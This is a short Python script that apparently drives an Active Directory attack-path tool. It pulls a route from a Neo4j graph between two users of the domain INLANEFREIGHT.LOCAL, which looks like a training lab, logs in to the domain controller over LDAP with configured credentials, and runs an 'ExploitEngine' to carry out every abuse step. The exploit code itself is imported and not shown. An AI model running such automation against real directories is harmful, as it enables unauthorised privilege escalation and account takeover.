import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager
from core.pathfinder.find_paths import Pathfinder
from core.exploit import ExploitEngine
from core.task_manager import TaskManager
from core.abuse.confirm import PathConfirmer
from ldap3 import Server, Connection, ALL

from utils.config_loader import load_config
config = load_config()
ldap_config = config.get('ldap', {})

# CONFIGURATION
DC_IP = ldap_config.get('dc_ip')
DOMAIN = ldap_config.get('domain')
SOURCE_USER = ldap_config.get('user')
SOURCE_PASS = ldap_config.get('password')

# 1. Find the Path (Neo4j)
db = DatabaseManager()
db.connect()
pf = Pathfinder(db)
path = pf.find_best_path("WLEY@INLANEFREIGHT.LOCAL", "ADUNN@INLANEFREIGHT.LOCAL")

server = Server(DC_IP, use_ssl=True, get_info=ALL)
conn = Connection(server, user=SOURCE_USER, password=SOURCE_PASS, auto_bind=True)

# 2. Initialize Engine with Config
engine = ExploitEngine(conn, domain=DOMAIN, dc_ip=DC_IP)

# 3. Initialize Task Manager with Initial Password
tm = TaskManager(engine)
tm.set_initial_password(SOURCE_PASS)

# 4. Run
tm.build_plan(path)
tm.execute_all()
